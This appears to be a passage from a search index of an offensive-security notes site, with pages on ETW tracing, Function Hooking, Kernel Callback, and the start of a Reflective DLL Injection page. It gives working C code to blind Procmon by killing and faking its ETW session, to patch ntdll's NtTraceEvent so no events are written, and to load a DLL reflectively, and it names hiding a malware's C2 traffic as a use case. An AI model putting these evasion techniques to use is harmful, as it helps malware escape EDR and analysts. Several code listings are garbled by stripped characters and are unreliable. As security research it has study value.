0x0000080000000000  Keyword.ADDRESS      ADDRESS\n# 0x0000100000000000  Keyword.CONTEXT_EVENT CONTEXT_EVENT\n# 0x0000200000000000  Keyword.STATE_TRANSITION STATE_TRANSITION\n# 0x0001000000000000  win:ResponseTime     Response Time\n# 0x0080000000000000  win:EventlogClassic  Classic\n# 0x8000000000000000  Microsoft-Windows-WinHttp/Diagnostic\n# 0x4000000000000000  Microsoft-Windows-WinHTTP-NDF/Diagnostic\n# ...\n\nLikewise, this command dumps the different event keys logged by the provider and several other information such as the verbosity level or the different processes that provide events to this provider.\nHowever, it is not possible to retrieve more information about the events as they are usually not documented and it is one of the most important problem with ETW for defenders.\nTracing sessions\nAs explained in the ETW workflow, the providers collect events raised by processes and tracing sessions will retrieve these events from the providers. The tracing sessions can be seen as a collection of events coming from different chosen providers.\nFor example, if you want to only retrieve event raised by memory allocation and HTTP connections, you will not be able to find one provider that collects these two types of events. However, you can create a tracing session fed by the Windows Kernel Tracing and the Microsoft-Windows-WinHTTP provider that will give you the two types of events you want.\nTracing sessions can be seen as a personal collection of events.\nList tracing sessions\nLogman can be used to display the active tracing sessions:\nlogman query -ets\n\n# Data Collector Set                      Type                          Status\n# -------------------------------------------------------------------------------\n# Circular Kernel Context Logger          Trace                         Running\n# Eventlog-Security                       Trace                         Running\n# DiagLog                                 Trace                         Running\n# Diagtrack-Listener                      Trace                         Running\n# EventLog-Application                    Trace                         Running\n# EventLog-System                         Trace                         Running\n# iclsClient                              Trace                         Running\n# ...\n\nInspect tracing sessions\nThe different tracing sessions are linked to providers. It is possible to inspect the providers queried by each tracing session with the following logman command:\nlogman query iclsClient -ets\n\n# Name:                 iclsClient\n# Status:               Running\n# Root Path:            C:\\Windows\\System32\\LogFiles\\WMI\\Intel\\iCLSClient\n# Segment:              Off\n# Schedules:            On\n# Segment Max Size:     40 MB\n# \n# Name:                 iclsClient\\iclsClient\n# Type:                 Trace\n# Output Location:      C:\\Windows\\System32\\LogFiles\\WMI\\Intel\\iCLSClient\\iclsClient.etl.013\n# Append:               Off\n# Circular:             On\n# Overwrite:            Off\n# Buffer Size:          4\n# Buffers Lost:         0\n# Buffers Written:      23\n# Buffer Flush Timer:   2\n# Clock Type:           Performance\n# File Mode:            File\n# \n# Provider:\n# Name:                 Intel-Autologger-iclsClient\n# Provider Guid:        {B8D7E9A0-65D5-40BE-AFEA-83593FC0164E}\n# Level:                255\n# KeywordsAll:          0x0\n# KeywordsAny:          0xffffffffffffffff\n# Properties:           64\n# Filter Type:          0\n\nUse tracing sessions\nThe following command can be used to start a tracing session\nlogman create trace ${tracingSessionName} -ets\n\nOnce the session is created, some providers must be added using the following command :\nlogman update ${tracingSessionName} -p ${providerName} ${eventValue} -ets\n\nLikewise, a provider can be removed using the following command:\nlogman update trace ${tracingSessionName} --p ${providerName} ${eventValue} -ets\n\nThe tracing session can be stopped using :\nlogman stop spotless-tracing -ets\n\nThe tracing session creates an etl file that can be viewed with Event Viewer.\nSilkETW\nSilkETW is a tool allowing simple access to ETW events. Indeed, even if logman is quite interesting to inspect providers and tracing sessions, it is not really flexible and easy to use. Moreover, logman can be resource consuming as it logs events system wide.\nSilkETW can be used to access to a specific provider and retrieve events either from userland or kerneland providers.\nThe tool will connect to a specific provider and dump the event in a file JSON formatted that can be easily displayed using a simple text editor.\nFor example, the following JSON represents an event raised by the kernel during a VirtualAlloc execution:\n{\n  \"ProviderGuid\": \"9e814aad-3204-11d2-9a82-006008a86939\",\n  \"YaraMatch\": [],\n  \"ProviderName\": \"MSNT_SystemTrace\",\n  \"EventName\": \"PageFault/VirtualAlloc\",\n  \"Opcode\": 98,\n  \"OpcodeName\": \"VirtualAlloc\",\n  \"TimeStamp\": \"2022-09-08T14:30:15.9588384+02:00\",\n  \"ThreadID\": 37036,\n  \"ProcessID\": 35088,\n  \"ProcessName\": \"HTTP\",\n  \"PointerSize\": 8,\n  \"EventDataLength\": 24,\n  \"XmlEventData\": {\n    \"ProviderName\": \"MSNT_SystemTrace\",\n    \"ProcessId\": \"35,088\",\n    \"EventName\": \"PageFault/VirtualAlloc\",\n    \"PID\": \"35088\",\n    \"Flags\": \"12,288\",\n    \"TID\": \"37036\",\n    \"BaseAddress\": \"0x1094a030000\",\n    \"RegionSize\": \"0x1000\",\n    \"MSec\": \"10155.6890\",\n    \"PName\": \"HTTP\"\n  }\n}\n\nThe Github documentation is well written and contains all the information needed to use the tool.\nProcmon\nProcmon is a tool from the SysInternal Suite that allows monitoring events system wide. In order to catch events, Procmon leverage the following techniques:\n\nSystem minifilters\nRegistry minifilters\nProcess and thread callback\nETW for network events\n\nBlinding Procmon\nFor some events such as the TCP connections, Procmon use the ETW events. Indeed, when using logman with Procmon launched, the Procmon Event Tracing Session can be found:\nlogman query -ets | Select-String PROCMON\n# PROCMON TRACE                           Trace                         Running\n\nThe goal is to be able to remove TCP and UDP entries from a Procmon tracing session.\nThe Pocmon tracing session can be easily stopped using logman :\nlogman stop \"PROCMON TRACE\" -ets\nOnce the session is stopped, Procmon is not able to log network events anymore as it only uses ETW to collect these events.\nAutomating the process\nUsing logman to blind Procmon is a nice proof of concept, however, a simple restart of Procmon fixes the problem as the session is restarted by the software.\nThe idea now is to be able to permanently blind Procmon. A use case is a malware performing network connection with a remote C2. Blinding Procmon will make the malware reversing less obvious. Indeed, there are several other tools that can be used to detect network connections performed, but it is a first step and as said before, a simnple proof of concept on ETW vulnerabilties.\nWhen Procmon is launched, it will automatically create a tracing session named PROCMON TRACE. this session is automatically killed when Procmon is closed. Thus, the idea is to list the different tracing session, and when a Procmon tracing session is found, the program will kill it and recreate a new one not linked to any provider.\nAs the new tracing session will not be linked to any provider, it will not forward any events to Procmon.\nThe Win32 API contains several functions to play with ETW tracing sessions:\n\nStartTrace: start a new tracing session\nStopTrace and ControlTrace : stop a given tracing session\nQueryTrace : retrieve the settings, properties and statistics of a tracing session\nQueryAllTrace : retrieve the settings, properties and statistics of all active tracing session\nPEVENT_TRACE_PROPERTIES : object used to store trace properties and statistics\n\nDetect Procmon tracing session\nFirst of all, an array of PEVENT_TRACE_PROPERTIES objects must be initialized:\n// By default, Windows does not support more than 64 parallele tracing sessions\n#define MAXIMUM_LOGGERS 64\n#define MAXSTR 1024\n\n// Array containing all tracing sessions\nPEVENT_TRACE_PROPERTIES  tracingSessions[MAXIMUM_LOGGERS];\n\n// Object representing a single tracing session\nULONG SizeForOneProperty = sizeof(EVENT_TRACE_PROPERTIES) + 2 * MAXSTR * sizeof(TCHAR);\nULONG SizeNeeded = MAXIMUM_LOGGERS * SizeForOneProperty;\nPEVENT_TRACE_PROPERTIES singleTracingSession = (PEVENT_TRACE_PROPERTIES)malloc(SizeNeeded);\n\n// Initializing tracingSessions internal structures\nfor (size_t LoggerCounter = 0; LoggerCounter Wnode.BufferSize = SizeForOneProperty;\n        singleTracingSession->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);\n        singleTracingSession->LogFileNameOffset = sizeof(EVENT_TRACE_PROPERTIES) + MAXSTR * sizeof(TCHAR);\n\n    // Set the value in the global tracing session array\n    tracingSessions[LoggerCounter] = singleTracingSession;\n    // Jump to the next tracing session to initialize\n        singleTracingSession = (PEVENT_TRACE_PROPERTIES)((PUCHAR)singleTracingSession + singleTracingSession->Wnode.BufferSize);\n}\n\nNow the array tracingSessions is initialized, it can be populated using the Win32 API:\n// Fill the tracingSessions array with all active sessions information\nULONG numberOfTracingSessions;\nStatus = QueryAllTraces(\n  tracingSessions,\n  MAXIMUM_LOGGERS,\n  &numberOfTracingSessions\n);\n\nFrom now, the tracingSessions object contains at least the name of all active tracing sessions accessible to the process.\nIndeed, some tracing sessions can only be accessed by a high integrity process.\nLet’s find the Procmon tracing session:\n// variable containing the tracing session name\nLPTSTR sessionName;\nfor(size_t tracingCount; tracingCount LoggerNameOffset > 0) && (tracingSessions[tracingCount]->LoggerNameOffset Wnode.BufferSize)) {\n    sessionName = (LPTSTR)((PUCHAR)tracingSessions[tracingCount] + tracingSessions[tracingCount]->LoggerNameOffset);\n  }\n  else {\n    sessionName = NULL;\n  }\n\n  // Check if it is the Procmon tracing session\n  if(_tcscmp(sessionName, L\"PROCMON_TRACE\")){\n    // start the attack\n    PEVENT_TRACE_PROPERTIES procmonTracingSession = tracingSessions[tracingCount];\n    ...\n    break;\n  }\n\n}\n\nNow the Procmon tracing session is found, let’s run the attack !\nKill Procmon tracing session\nThe first thing to do is to kill the Procmon tracing session:\nULONG status = StopTraceW((TRACEHANDLE)NULL, L\"PROCMON TRACE\", procmonTracingSession);\n\nAnd that's it... The StopTraceW Win32 API will do all the work and kill the tracing session. Just check the returned status to verify nothing goes wrong.\nAt this moment Procmon should not be able to monitor network events anymore.\nLet’s create a fake tracing session mimicking the Procmon legit tracing session.\nCreate a new tracing session\nFirst of all, a PEVENT_TRACE_PROPERTIES object must be initialized as shown in the first part:\n// Size allocated in the property object\nULONG SizeNeeded = sizeof(EVENT_TRACE_PROPERTIES) + 2 * MAXSTR * sizeof(TCHAR);\n\n// Object handling the tracing session properties\nPEVENT_TRACE_PROPERTIES newTracingSession = (PEVENT_TRACE_PROPERTIES)malloc(SizeNeeded);\nRtlZeroMemory(newTracingSession, SizeNeeded);\n\nnewTracingSession->Wnode.BufferSize = SizeNeeded;\n\n// Set the same expected `GUID`\nGUID  procMonGuid = { 0x75955553, 0x2055, 0x11ED, { 0xA6, 0x4B, 0x78, 0x2B, 0x46, 0x20, 0x15, 0xF6 } }\nnewTracingSession->Wnode.Guid = procMonGuid;\n\n// This information can be extracted using logman on the legit Procmon tracing session\nnewTracingSession->Wnode.ClientContext = 1;\nnewTracingSession->Wnode.Flags = EVENT_TRACE_FLAG_IMAGE_LOAD;\nnewTracingSession->LogFileMode = EVENT_TRACE_FILE_MODE_SEQUENTIAL;\n\nnewTracingSession->LoggerNameOffset = sizeof(EVENT_TRACE_PROPERTIES);\nnewTracingSession->LogFileNameOffset = newTracingSession->LoggerNameOffset + MAXSTR * sizeof(TCHAR);\n\nnewTracingSession->MaximumBuffers = 54;\n\ntracingSessionName = (LPTSTR)((PCHAR)newTracingSession + newTracingSession->LoggerNameOffset);\nlogFileName = (LPTSTR)((PCHAR)newTracingSession + newTracingSession->LogFileNameOffset);\n\n// Set the tracing session name and the log storing path\n_tcscpy_s(logFileName, MAXSTR, _T(\"C:\\\\LogFile.Etl\"));\n_tcscpy_s(tracingSessionName, MAXSTR, L\"PROCMON_TRACE\");\n\nThe tracing session object is initialized. Let’s register this new tracing session using the Win32 API:\nTRACEHANDLE tracingSessionHandle = 0;\nULONG status = StartTraceW(&tracingSessionHandle, tracingSessionName, newTracingSession);\n\nAnd that's it. The StartTraceW Win32 API will handle everything and start the tracing session.\nMake it persistent\nIf you try the previous code, it will do the same thing that what have been done using logman thus, any Procmon restart will erase the modification and re-allows it to monitor network events.\nIn order to make the change persistent, it is possible to loop the whole attack:\n// pseudo code\nwhile(1){\n  // Check if any procmon tracing session exist\n  if(!isActiveProcmonTracingSession){\n    sleep(2000);\n    continue;\n  }\n  // Retrieve the procmon tracing session\n  procmonTracingSession = getProcmonTracingSession();\n  // Stop it\n  stopProcmonTracingSession(procmonTracingSession);\n  // Create a fake one\n  createNewProcmonTracingSession(procmonTracingSession);\n  // Wait until the fake one is deleted by procmon\n  waitUntilProcmonSessionExists();\n}\n\nLimits\nThis attack is interesting to understand how ETW can be used by software (such as EDR) to monitor processes execution through ETW and how malwares can try to evade ETW monitoring by tampering tracing sessions established.\nThe problem with ETW is that tracing sessions are global among the system and the modification performed by a given userland process could impact the whole detection mechanism system wide. However, several protection can be set up to avoid tracing session tampering by unprivileged process.\nIndeed, some tracing session and providers can only be registered or updated by Protected Process Light or PPL processes. A good example is Defender ATP tracing sessions and providers. Even a high integrity process is not able to tamper the Defender tracing session.\nOf course, PPL limitation is not fully secured as driver code or exploit could allow a malicious process to bypass the security but it is a start.\nPatching ETW\nThe previous technique, focusing Procmon tracing session, leverages the fact that tracing sessions can be tampered by any process with the necessary privileges to access to the tracing session.\nThe following technique will not tamper the tracing sessions but the way a process reports events to the providers.\nIndeed, the events are raised by the different processes and written in the providers. If the process is unable to write a new event in the providers, the security applications such as EDR cannot retrieve and analyze these events.\nWriting event to a provider\nThe idea is to patch the Win32 API used to write event on the provider.\nIt is maybe possible to retrieve the Win32 API through documentation, but as everyone knows, 3 hours of debugging can avoid 15 minutes reading documentation. Thus let’s drop Microsoft documentation and fire up the debugger.\nFinding the API\nIn order to find the API responsible for event writing, let’s use a simple code that generates an easy-to-catch event.\nUsing logman the following provider is found:\nMicrosoft-Windows-WinHttp                {7D44233D-3055-4B9C-BA64-0D47CA40A232}\nThis provider is interesting as it is only used when WinHTTP API is used. \nThen, a simple code sending an HTTP request using the WinHTTP API:\n#include \n#include \n#include \n\n#pragma comment(lib, \"winhttp.lib\")\nint main(void) {\n\n    DWORD dwSize = 0;\n    DWORD dwDownloaded = 0;\n    LPSTR pszOutBuffer;\n    BOOL  bResults = FALSE;\n    HINTERNET  hSession = NULL,\n        hConnect = NULL,\n        hRequest = NULL;\n\n    // Use WinHttpOpen to obtain a session handle.\n    hSession = WinHttpOpen(L\"WinHTTP Example/1.0\",\n        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,\n        WINHTTP_NO_PROXY_NAME,\n        WINHTTP_NO_PROXY_BYPASS, 0);\n\n    // Specify an HTTP server.\n    if (hSession)\n        hConnect = WinHttpConnect(hSession, L\"www.microsoft.com\",\n            INTERNET_DEFAULT_HTTPS_PORT, 0);\n\n    // Create an HTTP request handle.\n    if (hConnect)\n        hRequest = WinHttpOpenRequest(hConnect, L\"GET\", NULL,\n            NULL, WINHTTP_NO_REFERER,\n            WINHTTP_DEFAULT_ACCEPT_TYPES,\n            WINHTTP_FLAG_SECURE);\n\n    // Send a request.\n    if (hRequest)\n        bResults = WinHttpSendRequest(hRequest,\n            WINHTTP_NO_ADDITIONAL_HEADERS, 0,\n            WINHTTP_NO_REQUEST_DATA, 0,\n            0, 0);\n\n\n    // End the request.\n    if (bResults)\n        bResults = WinHttpReceiveResponse(hRequest, NULL);\n\n    // Keep checking for data until there is nothing left.\n    if (bResults)\n    {\n        do\n        {\n            // Check for available data.\n            dwSize = 0;\n            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))\n                printf(\"Error %u in WinHttpQueryDataAvailable.\\n\",\n                    GetLastError());\n\n            // Allocate space for the buffer.\n            pszOutBuffer = new char[dwSize + 1];\n            if (!pszOutBuffer)\n            {\n                printf(\"Out of memory\\n\");\n                dwSize = 0;\n            }\n            else\n            {\n                // Read the data.\n                ZeroMemory(pszOutBuffer, dwSize + 1);\n\n                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,\n                    dwSize, &dwDownloaded))\n                    printf(\"Error %u in WinHttpReadData.\\n\", GetLastError());\n                else\n                    printf(\"%s\", pszOutBuffer);\n\n                // Free the memory allocated to the buffer.\n                delete[] pszOutBuffer;\n            }\n        } while (dwSize > 0);\n    }\n\n\n    // Report any errors.\n    if (!bResults)\n        printf(\"Error %d has occurred.\\n\", GetLastError());\n\n    // Close any open handles.\n    if (hRequest) WinHttpCloseHandle(hRequest);\n    if (hConnect) WinHttpCloseHandle(hConnect);\n    if (hSession) WinHttpCloseHandle(hSession);\n\n    return 0;\n}\n\nFinally, SilkETW is used to monitor the provider:\n.\\SilkETW.exe -t user -pn Microsoft-Windows-WinHttp  -ot file -p ./event.txt\n\nThe logfile written by SilkETW is JSON formatted and contains the Process ID it is thus easy to verify the event logged has been raised by our process or by another application running on the system.\nOnce SilkETW is launched and the test program compiled, let’s run it to verify if an event is raised. You should see between 2 and 4 events raised. The test program will raise these events each time it is run.\nLet’s go step by step. First, try to identify which function raises an event. Set some system(\"PAUSE\") before each function and wait for an event to be raised.\nFor example, the function WinHttpSendRequest will raise a single event. Let’s use this function for the next investigations.\nOnce the function is found, we will use a debugger to follow the call stack until an event is raised. The idea is to run the debugger until a call raise an event.\nInside the WINHTTP!WinHttpSendRequest function, the following line raises the event:\n\nThus, the program is restarted, a breakpoint is set in the function WINHTTP!WinHttpSendRequest and the code is debugged until a new event is raised.\nAfter iterating this process several times, the following call stack is found:\nWINHTTP.dll\n==========================================================\nHTTP_USER_REQUEST::SendRequest\nHTTP_USER_REQUEST::_SendRequestWithDrainComplete\nHTTP_USER_REQUEST::_CallGetProxyForUrl\nWxGetProxyContext::StartProxyResolve\nWxProxyManager::OnProcessGetProxyForUrl\nWinHttpClientCompletion::StartProxyResolve\nWinHttpClientResolver::GetProxyForUrlImpl\nWinHttpClientCompletion::OnProxyResolved\nWinHttpClientCompletion::StateStart\nMcTemplateU0q_EventWriteTransfer\nMcGenEventWrite_EventWriteTransfer\n\nNTDLL.dll\n==========================================================\nntdll!EtwEventWriteTransfer\nntdll!EtwpEventWriteFull\nntdll!NtTraceEvent\nSYSCALL\nThis callstack shows that the function EtwEventWriteFull is the Win32 API used to write an event in the provider when using the WinHTTP API. In fact, this API is used by every userland process. This is convenient as there is a single API to write events and it is located in the NTDLL.DLL.\nThus, this function can be patched to avoid process writing event in the providers.\nPatch the DLL\nNow we know which function is used to write events in the providers, let’s patch it to avoid any event written by the process.\nThe patch will be a simple ret added at the beginning of ntdll!NtTraceEvent. The following code can be used to apply the patch:\nvoid patchETW() {\n    // Retrieve the function to patch\n    PVOID NtTraceEvent = GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtTraceEvent\");\n    DWORD dwOld;\n    // Simple patch representing the ret instruction\n    DWORD retPatch = 0xc3;\n    // Modify page protection to be able to write the patch\n    // PAGE_EXECUTE_READWRITE is mandatory as the function is often used\n    VirtualProtect((LPVOID)((DWORD64)NtTraceEvent), 1, PAGE_EXECUTE_READWRITE, &dwOld);\n    // Write the patch\n    CopyMemory((LPVOID)((DWORD64)NtTraceEvent), &retPatch, 1);\n    // Reprotect the page as PAGE_EXECUTE_READ\n    VirtualProtect((LPVOID)((DWORD64)NtTraceEvent), 1, dwOld, &dwOld);\n}\n\nOnce the patch is applied, the modification can be analyzed in Windbg:\n\nFinally, the program is relaunched without debugger and the events are monitored using SilkETW. If the patch has been successfully implemented, no event should be monitored by SilkETW.\nLimits\nPatching the NtTraceEvent function is a quick way to deactivate ETW events raised by the process. However, as the NTDLL.dll is patched, any EDR performing integrity check will raise an alert. Likewise, in order to patch the API, the page protection is set as PAGE_EXECUTE_READWRITE during the patch writing, an EDR could find the action suspicious and raise an alert.\nHowever, the most important limit is that this attack will only patch event raised in usermode. Indeed, every event raised by kernel functions such as VirtualAlloc or network primitives cannot be avoided with this technique.\nIndeed, if you patch the ETW with this technique and you launch Procmon, it will still log the TCP connections performed as it uses ETW events raised by the kernel only. In order to fully patch ETW  a driver must be used. Fortunately, ETW structures are not monitored by KPP and can be patched without triggering a BSOD. But this will be a part of another blogpost...\n"},"Malware/Function hooking.html":{"url":"Malware/Function hooking.html","title":"Function Hooking","keywords":"","body":"Function Hooking\nTable of content\n\n\nDefinition\nHook example\nx86 : Add JMP patch\nx86 : NtSetProcessInformation - Hook syscall results\n\n\nResource\n\n\nDefinition\nA hook is a callback added to a method that will redirect program execution flow.

When a syscall is performed, the kernel send back the result to the usermode function and call the NtSetProcessInformation function first.\nThe NtSetProcessInformation takes as an argument a function pointer used as a callback function. Thus, this function will be executed each time the kernel communicates with the usermode. It then can be used to intercept any system calls performed, any process or thread created etc...\nBefore calling the callback, the registers must be saved in the stack. Then the callback function is called and the registers are popped out from the stack. this this for more explanations.\nR10 contains the last instruction pointer. When the callback is finished, just jump to R10 to continue the normal execution flow.\nThis is summarized in the following ASM code :\ninclude ksamd64.inc\n\n; the callback function that will be called and defined in the C file\nEXTERN hook:NEAR\n\n.code\nmedium  PROC\n\n    ; https://docs.microsoft.com/en-us/cpp/build/caller-callee-saved-registers\n\n    push rax ; return value if system call\n    push rcx\n    push RBX\n    push RBP\n    push RDI\n    push RSI\n    push RSP\n    push R12\n    push R13\n    push R14\n    push R15 \n\n    ; allocate stack\n    sub rsp, 1000h\n\n    ; set parameters for the hook function\n    mov rdx, rax\n    mov rcx, r10\n\n    ; call the hook function\n    call hook\n\n    ; erase the allocated stack\n    add rsp, 1000h\n\n    ; repop registers\n    pop R15 \n    pop R14\n    pop R13\n    pop R12\n    pop RSP\n    pop RSI\n    pop RDI\n    pop RBP\n    pop RBX\n    pop rcx\n    pop rax\n\n    ; jump to the normal execution flow\n    jmp R10\nmedium  ENDP\n\nEND\n\nResource\n\nNirvana Hooking : https://www.youtube.com/watch?v=pHyWyH804xE\n\n"},"Malware/Kernel callback.html":{"url":"Malware/Kernel callback.html","title":"Kernel Callback","keywords":"","body":"Kernel Callback\nTable of content\n\n\nIntroduction\nCallback message examples\nSysmon\nWindows functions\nRessource\n\n\nIntroduction\n\nThe kernel's callback mechanism provides a general way for drivers to request and provide notification when certain conditions are satisfied.\n\nKernel callbacks allow drivers to be notified for specific events. The driver can register a callback”in its code for any supported action. It will then receive a pre or post notification when the targeted action is performed. However callbacks will not perform any modification to the underlying Windows Kernel thus, avoiding any BSOD due to KPP.\nThe driver can register to an event list through the Win32 API such as the PsSetLoadImageNotifyRoutine.\nThis specific API allows a driver to be notified whenever an image such as a DLL or an EXE has been loaded.\nIn the following example, the function ObRegisterCallback is used to define two callbacks (PreoperationCallback and PostOperationCallback) to stop the creation of the notepad.exe process.\nEDR usually do not use this method but it is a good example of how kernel callbacks can be used.\nCallback message examples\nFor example, the following code :\n#include \n#include \n\nint main()\n{\n    HMODULE hModule = LoadLibraryA(\"winhttp.dll\");\n    printf(\"WinHTTP: 0x%p\\n\", hModule);\n    return 0;\n}\n\nAn event is generated by the kernel and caught with PsSetLoadImageNotifyRoutine:\nImage loaded:\nRuleName: -\nUtcTime: 2022-04-29 18:50:10.780\nProcessGuid: {3ebcda8b-3362-626c-a200-000000004f00}\nProcessId: 6716\nImage: C:\\Users\\admin\\Desktop\\main.exe\nImageLoaded: C:\\Windows\\System32\\winhttp.dll\nFileVersion: 10.0.19041.1620 (WinBuild.160101.0800)\nDescription: Windows HTTP Services\nProduct: Microsoft® Windows® Operating System\nCompany: Microsoft Corporation\nOriginalFileName: winhttp.dll\nHashes: SHA1=4F2A9BB575D38DBDC8DBB25A82BDF1AC0C41E78C,MD5=FB2B6347C25118C3AE19E9903C85B451,SHA256=989B2DFD70526098366AB722865C71643181F9DCB8E7954DA643AA4A84F3EBF0,IMPHASH=0597CE736881E784CC576C58367E6FEA\nSigned: true\nSignature: Microsoft Windows\nSignatureStatus: Valid\nUser: PUNCTURE\\admin\nSysmon\nSysmon is a tool from the SysInternals Suite that can be used to collect several event types generated by the Kernel.

However, this API does not work when the DLL content is stored in memory.\nMoreover, the LoadLibrary API raises some kernel events as it is shown in the following figure:\n\nUsing a Reflective DLL Injection is a way to reimplement a custom LoadLibrary function that will not raise any kernel events hence limiting detection from the Blue Team.\nBlueprint\nThe Reflective DLL Injection can be done through the following steps:\n\nStore the DLL content in memory\nParse the DLL header to retrieve the SizeOfImage value\nAllocate a memory space whose size is equal to the DLL SizeOfImage\nCopy each header and section in the allocated memory space\nPerform image base relocations if needed\nLoad dependencies DLL ie DLL used by the loaded DLL\nResolve imported functions and populate the Import Address Table (IAT)\nProtect memory sections according to DLL's sections needs\nRun the DLL TLS callbacks\nRun the DLL main function\nEnjoy !\n\nStore the DLL content in memory\nThis step is quite simple. The goal is to get a buffer with the whole DLL file's content in it. The following code can be used to load a full file in memory:\nBOOL FileExistsW(LPCWSTR szPath){\n    DWORD dwAttrib = GetFileAttributesW(szPath);\n    return (dwAttrib != INVALID_FILE_ATTRIBUTES && !(dwAttrib & FILE_ATTRIBUTE_DIRECTORY));\n}\n\nPBYTE ReadFileW(LPCWSTR filename, PDWORD fileSize) {\n\n    // Open the file with read permissions\n    HANDLE hFile = CreateFileW(filename, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);\n    if (hFile == INVALID_HANDLE_VALUE) {\n        return NULL;\n    }\n\n    // Retrieve the file size\n    *fileSize = GetFileSize(hFile, NULL);\n    DWORD sizeRead = 0;\n\n    // Allocate size in heap to contains the file content\n    PBYTE content = (PBYTE)malloc(*fileSize);\n\n    // Populate the allocated buffer with the file content\n    DWORD result = ReadFile(hFile, content, *fileSize, &sizeRead, NULL);\n    if (!result || sizeRead != *fileSize) {\n        DEBUG(\"[x] Error during %ls file read\\n\", filename);\n        free(content);\n        content = NULL;\n    }\n    CloseHandle(hFile);\n\n    // Return the buffer\n    return content;\n}\n\nSo now the whole DLL content is stored in memory and is ready to be injected.\nInject the DLL\nTo inject whatever in memory you need to know the global size of the thing you want to inject. For PE files, such as DLL, the full file size can be found in the nt headers.\nThe post goal is not to create a PE parser so each fields of the PE will not be explicitly documented in this post.\nThe full DLL size can be found with the following code that retrieves the OptionalHeader.SizeOfImage:\n// dllContent is the first byte of the DLL stored in memory\nDWORD getImageSize(PVOID dllContent){\n    IMAGE_NT_HEADERS* ntHeaders = (IMAGE_NT_HEADERS*)((PBYTE)dllContent + pe->dosHeader->e_lfanew);\n    return ntHeaders->OptionalHeader.SizeOfImage\n}\n\nThen, once the full size is known, a memory page is allocated using VirtualAlloc:\nPVOID startAddress = VirtualAlloc(\n    NULL, \n    dllParsed->ntHeader->OptionalHeader.SizeOfImage, \n    MEM_COMMIT | MEM_RESERVE, \n    PAGE_READWRITE\n);\n\nSo now, the allocated page must be populated with the DLL's headers and sections:\nIMAGE_NT_HEADERS* ntHeader = (IMAGE_NT_HEADERS*)((PBYTE)dllContent + pe->dosHeader->e_lfanew);\n\n// Copy the headers\nCopyMemory(startAddress, dllContent, ntHeader->OptionalHeader.SizeOfHeaders);\n\n// Copy the sections\nPIMAGE_SECTION_HEADER sectionHeader = IMAGE_FIRST_SECTION(dllParsed->ntHeader);\nfor (DWORD i = 0; i FileHeader.NumberOfSections; i++, sectionHeader++) {\n    CopyMemory(\n        (PBYTE)startAddress + sectionHeader->VirtualAddress, \n        (PBYTE)dllContent + sectionHeader->PointerToRawData, \n        sectionHeader->SizeOfRawData\n    );\n}\n\nAt the end of these steps, the whole DLL is loaded in memory at the address startAddress. \nIn a better world, this could be the end and the DLL entry point could be run straight away. However, there is a high probability that your DLL has not been loaded to its preferred base address.\nThus, several relocations must be done before being able to run you DLL. \nPerform image base relocations\nWhen a PE is compiled, the symbols are referenced as if the PE is loaded at a given base address. This address is the PE preferred loading address or the ImageBase address.\nIf the PE is not loaded to its preferred ImageBase address, the load address shift breaks all absolute references among the PE.\nFor example, if the PE has been compiled to reference the data A from the address 0x40000, this reference only works if the PE is loaded to the same base address as the one used during compilation. If the PE is loaded to another base address, the reference 0x40000 will not point to the A data anymore but to an arbitrary data in the process memory space. The A data will be stored at 0x4000 + offset where the offset is the difference between the current loading address and the preferred ImageBase address.\nThe .reloc section contains all the hardcoded absolute references that need fixing if the PE is not loaded at its preferred base address.\nIn a nutshell, symbols referenced by their absolute address are not hardcoded into the .text section. Their references in the .text section point to the .reloc section. The .reloc section is used as a lookup table between the symbol reference in .text and its absolute definition address.\nSymbol Table\nThe .reloc section contains the Relocation Table. This table is divided into blocks that represents the base relocation.\nThe start address for the Relocation Table can be retrieved in the PE DataDirectory located in the NtHeader's OptionalHeader parameter:\nPVOID firstRelocationBlock = ntHeader->OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress\n\nEach block starts with an IMAGE_BASE_RELOCATION and is followed by any number of offsets and field entries.\nThe IMAGE_BASE_RELOCATION part can be parsed using the following structure:\ntypedef struct _IMAGE_BASE_RELOCATION {\n    DWORD   VirtualAddress;\n    DWORD   SizeOfBlock;\n} IMAGE_BASE_RELOCATION;\n\nThe different relocation entries can be iterated from the VirtualAddress address to the VirtualAddress + SizeOfBlock address. So, once the IMAGE_BASE_RELOCATION object is extracted from the relocation table block, it can be used to access to the relocation entries as the relocation table structure can be seen as follows:\n\nThe different IMAGE_BASE_RELOCATION can be iterated using the following code:\n//pseudo code\nIMAGE_BASE_RELOCATION* currentRelocation = firstRelocationBlock\nwhile(currentRelocation->VirtualAddress){\n    // Process the current relocation block\n    ...\n    // Jump to the next relocation block\n    currentRelocation = (PBYTE)currentRelocation + currentRelocation->SizeOfBlock;\n}\n\nSo now, it is needed to access to each relocation block's entry. These entries can be parsed using the following structure:\ntypedef struct _IMAGE_RELOCATION_ENTRY {\n    WORD Offset : 12;\n    WORD Type : 4;\n} IMAGE_RELOCATION_ENTRY;\n\nEach entry contained in the relocation block can be parsed using the following code:\n// pseudo code\n// IMAGE_BASE_RELOCATION *currentRelocation : the current relocation block\nIMAGE_RELOCATION_ENTRY* relocationEntry = &currentRelocation[1];\nwhile ((DWORD64)relocationEntry SizeOfBlock){\n    // process the relocation\n    ...\n    // jump to the next entry\n    relocationEntry++;\n}\n\nSo, to summarize, the following code can be used to parse a full relocation table:\n//pseudo code\nIMAGE_BASE_RELOCATION* currentRelocation = ntHeader->OptionalHeader->DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress\nwhile(currentRelocation->VirtualAddress){\n    // process the current relocation block\n    IMAGE_RELOCATION_ENTRY* relocationEntry = &currentRelocation[1];\n    while ((DWORD64)relocationEntry SizeOfBlock){\n        // process the relocation\n        ...\n        // jump to the next entry\n        relocationEntry++;\n    }\n    // jump to the next relocation block\n    currentRelocation = (PBYTE)currentRelocation + currentRelocation->SizeOfBlock;\n}\n\nPerform relocation\nPerforming a relocation is modifying the Relocation Table entries and add an offset equal to the difference of the PE preferred load address and the real PE load address.\nSo, the relocation address must be found, and its content must be updated. In order to update the relocation content, the relocation type must be taken into account. Indeed, depending on the relocation type, the modification can 